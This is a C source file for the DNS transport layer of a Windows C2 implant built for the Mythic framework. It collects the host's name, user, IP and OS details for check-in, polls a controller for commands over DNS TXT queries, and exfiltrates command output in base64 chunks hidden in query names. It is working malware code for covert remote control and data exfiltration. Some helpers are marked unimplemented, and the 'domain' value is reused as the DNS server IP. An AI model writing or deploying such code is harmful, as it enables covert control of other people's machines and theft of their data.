/**
* Transport_mythic.c - Mythic-compatible DNS transport for C2 Agent
* 
* Implements DNS communication for the C2 agent using Windows DNS API,
* compatible with the Mythic C2 framework.
*/

#include <windows.h>
#include <windns.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../include/Transport.h"
#include "../include/Utils.h"
#include "../include/Config.h"
#include "../include/mythic.h"

#pragma comment(lib, "dnsapi.lib")

// Maximum size for DNS chunks (DNS labels are limited to 63 characters)
#define MAX_DNS_CHUNK_SIZE 15  // Reduced from 30 to avoid DNS label length issues

// Maximum retries for DNS queries
#define MAX_DNS_RETRIES 3

// Delay between retries (in milliseconds)
#define DNS_RETRY_DELAY 1000

// Delay between chunks (in milliseconds)
#define DNS_CHUNK_DELAY 500

// Maximum size for DNS query
#define MAX_QUERY_SIZE 512

// Current task ID
static char g_current_task_id[37] = {0};

/**
* Initialize the DNS transport module
* 
* @return TRUE if successful, FALSE otherwise
*/
BOOL dns_transport_init() {
    // Initialize Winsock (required for DNS functions)
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }
    
    // Initialize Mythic integration
    if (!mythic_init()) {
        WSACleanup();
        return FALSE;
    }
    
    return TRUE;
}

/**
* Clean up the DNS transport module
*/
void dns_transport_cleanup() {
    // Clean up Mythic integration
    mythic_cleanup();
    
    // Clean up Winsock
    WSACleanup();
}

/**
* Perform a DNS TXT query with explicit server
* 
* @param query The DNS query string
* @param server_ip The DNS server IP address
* @return The TXT record data (must be freed by caller), or NULL on error
*/
static char* dns_txt_query_with_server(const char* query, const char* server_ip) {
    PDNS_RECORD dnsRecord = NULL;
    char* result = NULL;
    
    printf("[DEBUG] Performing DNS TXT query: %s (Server: %s)\n", query, server_ip);
    
    // Validate server IP
    if (inet_addr(server_ip) == INADDR_NONE) {
        printf("[ERROR] Invalid server IP address: %s\n", server_ip);
        return NULL;
    }
    
    // Set up the DNS server IP
    IP4_ARRAY dnsServers;
    dnsServers.AddrCount = 1;
    dnsServers.AddrArray[0] = inet_addr(server_ip);
    
    // Retry mechanism for DNS queries
    for (int retry = 0; retry < MAX_DNS_RETRIES; retry++) {
        printf("[DEBUG] DNS query attempt %d/%d\n", retry + 1, MAX_DNS_RETRIES);
        
        DNS_STATUS status = DnsQuery_A(
            query,                 // Domain name to query
            DNS_TYPE_TEXT,         // Type of record to query (TXT)
            DNS_QUERY_BYPASS_CACHE,// Bypass cache
            &dnsServers,           // Use specific DNS servers
            &dnsRecord,            // Result
            NULL                   // Reserved for future use
        );
        
        printf("[DEBUG] DNS query status: %lu\n", status);
        
        if (status == ERROR_SUCCESS && dnsRecord && dnsRecord->wType == DNS_TYPE_TEXT) {
            // Get the TXT record data
            if (dnsRecord->Data.TXT.dwStringCount > 0 && dnsRecord->Data.TXT.pStringArray[0] != NULL) {
                DWORD dataLength = strlen(dnsRecord->Data.TXT.pStringArray[0]);
                result = (char*)malloc(dataLength + 1);
                
                if (result) {
                    strcpy_s(result, dataLength + 1, dnsRecord->Data.TXT.pStringArray[0]);
                    printf("[DEBUG] DNS query successful, received data: %s\n", result);
                }
            }
            
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            break;
        }
        
        // If we have a record but no result, free it
        if (dnsRecord) {
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            dnsRecord = NULL;
        }
        
        // If this isn't the last retry, wait before trying again
        if (retry < MAX_DNS_RETRIES - 1) {
            printf("[DEBUG] Retrying DNS query in %d ms\n", DNS_RETRY_DELAY);
            Sleep(DNS_RETRY_DELAY);
        }
    }
    
    if (result == NULL) {
        printf("[DEBUG] DNS query failed, no result\n");
    }
    
    return result;
}

/**
* Perform initial check-in with Mythic
* 
* @param domain The C2 domain
* @return TRUE if successful, FALSE otherwise
*/
BOOL mythic_checkin(const char* domain) {
    // Get system information for check-in
    char* hostname = get_hostname();
    char* username = get_username();
    char* windows_version = get_windows_version(); // You'll need to implement this
    char* primary_ip = get_primary_ip(); // You'll need to implement this
    
    if (!hostname || !username || !windows_version || !primary_ip) {
        if (hostname) free(hostname);
        if (username) free(username);
        if (windows_version) free(windows_version);
        if (primary_ip) free(primary_ip);
        return FALSE;
    }
    
    // Create checkin structure
    MythicCheckin checkin;
    strcpy_s(checkin.hostname, sizeof(checkin.hostname), hostname);
    strcpy_s(checkin.username, sizeof(checkin.username), username);
    strcpy_s(checkin.ip, sizeof(checkin.ip), primary_ip);
    strcpy_s(checkin.os, sizeof(checkin.os), "Windows");
    strcpy_s(checkin.os_version, sizeof(checkin.os_version), windows_version);
    strcpy_s(checkin.architecture, sizeof(checkin.architecture), "x64");
    sprintf_s(checkin.pid, sizeof(checkin.pid), "%d", GetCurrentProcessId());
    strcpy_s(checkin.uuid, sizeof(checkin.uuid), mythic_get_uuid());
    
    // Create checkin message
    size_t message_len;
    char* message = mythic_create_checkin_message(&checkin, &message_len);
    
    // Free allocated memory
    free(hostname);
    free(username);
    free(windows_version);
    free(primary_ip);
    
    if (!message) {
        return FALSE;
    }
    
    // Encode the message
    size_t encoded_len;
    char* encoded_message = base64_encode((unsigned char*)message, message_len, &encoded_len);
    free(message);
    
    if (!encoded_message) {
        return FALSE;
    }
    
    // Format the query string for checkin
    char query[MAX_QUERY_SIZE];
    sprintf_s(query, sizeof(query), "checkin-%s.%s", encoded_message, domain);
    
    // Get the C2 domain (which is actually the server IP in our case)
    const char* server_ip = domain;
    
    // Perform the DNS TXT query
    char* response = dns_txt_query_with_server(query, server_ip);
    free(encoded_message);
    
    if (!response) {
        return FALSE;
    }
    
    // Parse the response (should contain the UUID)
    // In a real implementation, you'd parse the JSON response
    // For now, we'll just use the UUID we generated
    
    free(response);
    return TRUE;
}

/**
* Request a command from the C2 server
* 
* @param agent_id The agent ID
* @param domain The C2 domain
* @return The command (must be freed by caller), or NULL if no command
*/
char* dns_request_command(const char* agent_id, const char* domain) {
    // Format the query string
    char query[MAX_QUERY_SIZE];
    sprintf_s(query, sizeof(query), "tasking-%s.%s", mythic_get_uuid(), domain);
    
    // Get the C2 domain (which is actually the server IP in our case)
    const char* server_ip = domain;
    
    // Perform the DNS TXT query with explicit server
    char* encoded_command = dns_txt_query_with_server(query, server_ip);
    if (encoded_command == NULL) {
        return NULL;
    }
    
    // Decode the base64 command
    size_t decoded_size;
    unsigned char* decoded_command = base64_decode(encoded_command, strlen(encoded_command), &decoded_size);
    free(encoded_command);
    
    if (decoded_command == NULL) {
        return NULL;
    }
    
    // Parse the Mythic task
    MythicTask task;
    if (mythic_parse_tasking_message((char*)decoded_command, decoded_size, &task)) {
        // Store the task ID for later use
        strcpy_s(g_current_task_id, sizeof(g_current_task_id), task.id);
        
        // Format the command string as expected by execute_command
        char* command_str = (char*)malloc(strlen(task.command) + strlen(task.params) + 2);
        if (command_str) {
            sprintf_s(command_str, strlen(task.command) + strlen(task.params) + 2,
                     "%s %s", task.command, task.params);
            
            free(decoded_command);
            return command_str;
        }
    }
    
    free(decoded_command);
    return NULL;
}

/**
* Send command execution results back to the C2 server
* 
* @param agent_id The agent ID
* @param result_id The result ID
* @param result The command execution result
* @param domain The C2 domain
* @return TRUE if successful, FALSE otherwise
*/
BOOL dns_send_result(const char* agent_id, const char* result_id, const char* result, const char* domain) {
    if (result == NULL) {
        return FALSE;
    }
    
    // Format the result as a Mythic response
    size_t message_len;
    char* mythic_response = mythic_create_response_message(g_current_task_id, result, &message_len);
    if (!mythic_response) {
        return FALSE;
    }
    
    // Get the C2 domain (which is actually the server IP in our case)
    const char* server_ip = domain;
    
    // Calculate the number of chunks needed
    size_t response_len = strlen(mythic_response);
    int num_chunks = (response_len + MAX_DNS_CHUNK_SIZE - 1) / MAX_DNS_CHUNK_SIZE;
    
    printf("[DEBUG] Sending result in %d chunks\n", num_chunks);
    
    // Send each chunk
    for (int i = 0; i < num_chunks; i++) {
        // Extract the chunk
        size_t chunk_size = (i == num_chunks - 1) ? 
                          (response_len - i * MAX_DNS_CHUNK_SIZE) : 
                          MAX_DNS_CHUNK_SIZE;
        
        char chunk[MAX_DNS_CHUNK_SIZE + 1];
        memcpy(chunk, mythic_response + (i * MAX_DNS_CHUNK_SIZE), chunk_size);
        chunk[chunk_size] = '\0';
        
        // Encode the chunk
        size_t encoded_size;
        char* encoded_chunk = base64_encode((unsigned char*)chunk, chunk_size, &encoded_size);
        if (encoded_chunk == NULL) {
            free(mythic_response);
            return FALSE;
        }
        
        // Format the query string - using hyphens instead of dots for the data part
        char query[MAX_QUERY_SIZE];
        sprintf_s(query, sizeof(query), "response-%s-%d-%s.%s", 
                 mythic_get_uuid(), i, encoded_chunk, domain);
        
        printf("[DEBUG] Sending chunk %d/%d: %s\n", i + 1, num_chunks, encoded_chunk);
        printf("[DEBUG] Query: %s\n", query);
        
        // Perform the DNS TXT query with explicit server
        char* response = dns_txt_query_with_server(query, server_ip);
        free(encoded_chunk);
        
        // Check for acknowledgment
        BOOL acknowledged = FALSE;
        if (response != NULL) {
            if (strcmp(response, "ACK") == 0) {
                acknowledged = TRUE;
                printf("[DEBUG] Chunk acknowledged\n");
            }
            free(response);
        }
        
        if (!acknowledged) {
            printf("[DEBUG] Chunk not acknowledged\n");
            free(mythic_response);
            return FALSE;
        }
        
        // Small delay between chunks
        if (i < num_chunks - 1) {
            Sleep(DNS_CHUNK_DELAY);
        }
    }
    
    free(mythic_response);
    return TRUE;
}
